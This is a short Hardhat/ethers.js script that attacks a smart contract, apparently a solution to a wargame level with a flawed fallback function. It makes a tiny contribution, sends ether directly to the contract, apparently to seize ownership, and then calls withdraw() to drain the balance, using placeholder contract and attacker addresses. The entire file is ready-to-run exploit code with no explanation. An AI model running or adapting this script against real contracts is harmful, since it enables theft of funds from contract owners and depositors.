const { ethers } = require("hardhat");

const contractAddress = "CONTRACT_ADDRESS";
const attackerAddress = "ATTACKER_ADDRESS";

const abi = [
    "function contribute() public payable",
    "function withdraw() public",
    "function getContribution() public view returns (uint256)",
  ];

async function main() {
  const provider = new ethers.providers.JsonRpcProvider();
  const contract = new ethers.Contract(contractAddress, abi, provider);

  const attackerSigner = provider.getSigner(attackerAddress);

  const contribution = ethers.utils.parseEther("0.0009");
  await contract.connect(attackerSigner).contribute({
    value: contribution,
  });

  const tx = {
    to: contractAddress,
    value: ethers.utils.parseEther("0.001"),
  };
  await attackerSigner.sendTransaction(tx);

  await contract.connect(attackerSigner).withdraw();

  const balance = await provider.getBalance(contractAddress);
  console.log(`Contract balance: ${ethers.utils.formatEther(balance)} ETH`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
